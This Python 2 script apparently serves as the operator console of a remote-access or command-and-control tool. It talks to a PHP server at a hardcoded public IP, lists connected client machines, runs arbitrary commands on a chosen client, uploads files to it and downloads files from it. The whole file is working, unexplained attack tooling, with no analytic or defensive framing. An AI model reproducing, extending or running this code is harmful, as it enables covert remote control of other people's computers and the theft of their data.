from __future__ import print_function
import requests
import time
import threading
import json
import os

# design constants
# serverip = 'localhost'
serverip = '18.213.1.57'
server_file = 'http://'+serverip+'/joseph/files/'
server_uri = 'http://'+serverip+'/joseph/server.php'
clients = []
actions = [
    'executeCommand', 
    'getClientList', 
    'get_command_result', 
    'upload', 
    'get_client_upload',
    'get_client_download',
]

event = threading.Event()

# post request to server
def post(data):
    try:
        response = requests.post(server_uri, data = data)
        return response.text
    except Exception as e:
        return e

# show snipping
def snipping():
    # function to print snipping
    animation = "|/-\\"
    idx = 0
    while True:
        print(animation[idx % len(animation)], end="\r")
        idx += 1
        time.sleep(0.05)
        if event.is_set():
            print(" ", end="\r")
            break

# select options
def let_user_pick(options):
    animation_print("\nPlease choose action:")

    for idx, element in enumerate(options):
        animation_print("{}) {}".format(idx + 1, element))

    while True:
        i = raw_input("Enter number: ")
        if i:
            try:
                if 0 < int(i) <= len(options):
                    return int(i) - 1
                else:
                    animation_print("Please input number in list")
            except:
                animation_print("Please input number")

# module to input client id
def input_client():
    while True:
        client_id = raw_input("\ninput client id: ")
        if client_id:
            result = post({'action': actions[1]})
            clients = json.loads(result)
            if client_id in clients: 
                break
            else: 
                animation_print('\n !!!Not exist, Please check list')
                animation_print(result)
    return client_id

# get filename from filepath:
def getFileName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a=y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[a+1:]
    return filename

# get foldername from filepath:
def getFolderName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a = y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[0:a]
    return filename

# print string with animation effect
def animation_print(message, speed=0.02):
    for character in message:
        print (character, end = "")
        time.sleep(speed)
    print()

# print welcome message
def welcome_message():
    print(" _       __________    __________  __  _________")
    print("| |     / / ____/ /   / ____/ __ \/  |/  / ____/")
    print("| | /| / / __/ / /   / /   / / / / /|_/ / __/")
    print("| |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___")
    print("|__/|__/_____/_____/\____/\____/_/  /_/_____/")

############################## START MAIN FUNCTION #############################
if __name__ == "__main__":
    welcome_message()
    while True:
        options = ["Get Clients List", "Execute Command", "Upload File", "Download File"]
        
        res = let_user_pick(options)
        
        if options[res] == "Get Clients List":
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            result = post({'action': actions[1]})
            event.set()
            time.sleep(0.1)
            animation_print(result)
            event.clear()
        
        elif options[res] == "Execute Command":
            client_id = input_client()
            cma_msg = raw_input("input command: ")
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            post({'action': actions[0], 'client_id': client_id, 'cma_msg': cma_msg})
            i=0
            while i < 20:
                time.sleep(1)
                i += 1
                try:
                    result = post({'action': actions[2], 'client_id': client_id})
                    if(result.encode('utf8')[-2:] != 'no'):
                        event.set()
                        time.sleep(0.1)
                        print(result)
                        event.clear()
                        break
                except Exception as e:
                    event.set()
                    time.sleep(0.1)
                    animation_print(e)
                    event.clear()
            if i==20:
                event.set()
                time.sleep(0.1)
                animation_print(result)
                event.clear()
        
        elif options[res] == "Upload File":
            client_id = input_client()
            filepath = raw_input("input filepath or drag file: ")
            # print("input filepath %s" % cma_msg, end="")
            try:
                fo = open(filepath,'rb')
                filename = getFileName(filepath).replace("/", "\\")
                destpath = raw_input("input destination path: ").replace("/", "\\")
                destfoler= getFolderName(destpath)
                destfile = getFileName(destpath)
                file = {'myfile': fo}
                t1 = threading.Thread(target=snipping, args=())
                t1.start()
                r = requests.post(server_uri, files=file, data={'action': actions[3], 'cma_msg': destpath, 'client_id': client_id})
                if r.status_code != 200:
                    event.set()
                    time.sleep(0.1)
                    animation_print('\n sendErr: '+r.url)
                else :
                    # print('\n Successfully uploaded', r.text)
                    while True:
                        time.sleep(2)
                        result = post({'action': actions[5], 'client_id': client_id})
                        if (result.encode('utf8')[-2:] == 'ss'):
                            # print(result)
                            event.set()
                            time.sleep(0.1)
                            animation_print('\nsuccessfully uploaded')
                            break
                        elif (result.encode('utf8')[-2:] == 'or'):
                            event.set()
                            time.sleep(0.1)
                            # print(result)
                            animation_print('\nerror occured while uploading')
                            break
                event.clear()
                fo.close()
            except Exception as e:
                animation_print("\n!!!Can't find that file\n")
        
        elif options[res] == "Download File":
            client_id = input_client()
            filepath  = raw_input("input filename: ").replace("/", "\\")
            filename  = getFileName(filepath)

            destpath  = raw_input("input destination path: ").replace("/", "\\")
            destfoler = getFolderName(destpath)
            
            try:
                if not os.path.exists(destfoler):
                    os.makedirs(destfoler)
                    animation_print(destfoler+' is created')
            except Exception as e:
                destfoler = '.'
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            post({'action':'download', 'cma_msg':filepath, 'client_id': client_id})
            # i=0
            while True:
                time.sleep(1)
                result = post({'action': actions[4], 'client_id': client_id})
                if (result.encode('utf8')[-2:] == 'le'):
                    event.set()
                    time.sleep(0.1)
                    animation_print(result)
                    event.clear()
                    break
                elif(result.encode('utf8')[-2:] == 'ed'):
                    file_url = server_file+filename
                    r = requests.get(file_url) # create HTTP response object   
                    with open(destpath,'wb') as f:
                        f.write(r.content)
                    event.set()
                    time.sleep(0.1)
                    animation_print('\nSuccessfully downloaded')
                    event.clear()
                    break
                    
            
############################### END MAIN FUNCTION ##############################
